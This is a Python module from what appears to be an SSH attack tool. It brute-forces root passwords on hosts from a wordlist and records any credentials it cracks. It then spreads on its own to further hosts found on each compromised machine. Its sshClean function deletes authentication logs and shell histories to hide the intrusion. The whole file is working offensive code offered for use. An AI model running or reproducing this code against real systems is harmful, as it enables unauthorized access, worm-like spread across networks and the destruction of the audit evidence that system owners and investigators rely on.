# Modules required for the functions defined here
import paramiko
import socket

# Custom modules
import modules.getHosts as getHosts
import modules.saveDetails as saveDetails

usedHosts = set()

def sshClean(sshclient):
    """
    Cleans logs
    """

    stdin, stdout, stderr = sshclient.exec_command("rm -rf /var/log/secure /var/log/auth.log")
    stdin, stdout, stderr = sshclient.exec_command("for i in $( locate __pycache__ ); do if [[ -d $i ]]; then rm -rf $i; fi; done")
    stdin, stdout, stderr = sshclient.exec_command("for i in $( locate .python_history ); do if [[ -f $i ]]; then rm -f $i; fi; done")
    stdin, stdout, stderr = sshclient.exec_command("history -c && rm ~/.bash_history")

def sshDictionary(host, plist, username = "root", port = 22) -> list:
    """
    This function starts the dictionary attack on the SSH username and host,
    Until a match is found.
    """

    # Creating the SSH connection
    print(f"\n-- \033[0;93mConnecting to\033[0m -- \033[0;91m{host}\033[0m  --")
    sshclient = paramiko.SSHClient()
    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for passw in plist:
        # Trying each password in the wordlist

        try:
            sshclient.connect(
                host,
                port = port,
                username = username,
                password = passw,
            )

        except socket.gaierror:
            print(f"[\033[0;91m!\033[0m] Invalid host address -- {host} -- skipping")
            return []
        except (TimeoutError, paramiko.ssh_exception.SSHException, paramiko.ssh_exception.IncompatiblePeer, paramiko.ssh_exception.NoValidConnectionsError):
            print(f"[\033[0;91m!\033[0m] SSH Connection not available or Host down -- skipping --")
            return [ False, False ]
        except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.BadAuthenticationType):
            print(f"[~] Password attempt failed: \033[0;93m{passw}\033[0m")
        except KeyboardInterrupt:
            print("\n[\033[0;91m!\033[0m] Stopped...")
            return [ False, False ]
        else:
            print(f"[\033[0;92m~\033[0m] Connected to \033[0;92m{host}\033[0m via user:\033[0;91mroot\033[0m")
            return [ sshclient, passw ]
    return [ False, False ]

def sshFinder(hosts, plist):
    """
    This function will start the ssh login process, dictionary attack using the `plist` list of password provided.
    The first argument is `hosts` list having host ipv4 addr in format ["192.168.x.x", "192.xxx.x.x", ]
    """
    
    for host in hosts:
        
        # Stopping recursion of already visited hosts
        if host in usedHosts:
            print(f"[\033[0;93m!\033[0m] Host already tried before: {host} -- skipping\n")
            continue
        usedHosts.add(host)

        try:
            # Trying to dictionary find host access
            sshclient, passw = sshDictionary(host, plist)

            if ( sshclient == False ) or ( passw == False ):
                print(f"\n[\033[0;92m!\033[0m] --- Password not found ---\n")
                continue

            # Saving the logs
            saveDetails.saveLogFile(host, passw)

            # Executing the next loop
            x = getHosts.getHosts(sshclient)
            print(f"Found possible hosts from this machine ({host}): ", x)
            sshFinder(x, plist)

            # Cleaning tracks
            sshClean(sshclient)

            # Closing the session
            sshclient.close()
            print(f"[\033[0;92m$\033[0m] Connection closed -- {host}\n")
                
        except socket.gaierror:
            print(f"[\033[0;91m!\033[0m] Invalid host address -- {host} -- skipping")
            break
        except (TimeoutError, paramiko.ssh_exception.SSHException, paramiko.ssh_exception.IncompatiblePeer, paramiko.ssh_exception.NoValidConnectionsError):
            print(f"[\033[0;91m!\033[0m] SSH Connection not available or Host down")
            break
        except KeyboardInterrupt:
            print("\n[\033[0;91m!\033[0m] Stopped...")
            exit()

def sshCrupter():
    return None